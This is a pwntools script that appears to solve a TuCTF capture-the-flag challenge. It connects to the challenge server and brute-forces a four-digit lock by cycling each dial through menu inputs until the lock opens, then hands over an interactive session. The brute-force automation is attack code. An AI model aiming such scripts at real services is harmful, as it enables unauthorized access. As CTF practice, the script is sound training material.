#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pwn')
p=remote("chal.tuctf.com",30002)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)
for a in range(10):
    for b in range(10):
        for c in range(10):
            for d in range(10):
                res=ru(b"exit\n")
                if b"still locked" not in res:
                    print(res)
                    exit()
                sl(b"1")
                sla(b"4)\n",b"4")
                sla(b"-)\n",b"+")
            sla(b"exit\n",b"1")
            sla(b"4)\n",b"3")
            sla(b"-)\n",b"+")
        sla(b"exit\n",b"1")
        sla(b"4)\n",b"2")
        sla(b"-)\n",b"+")
        # print(a,b,c,d)
    sla(b"exit\n",b"1")
    sla(b"4)\n",b"1")
    sla(b"-)\n",b"+")
p.interactive()
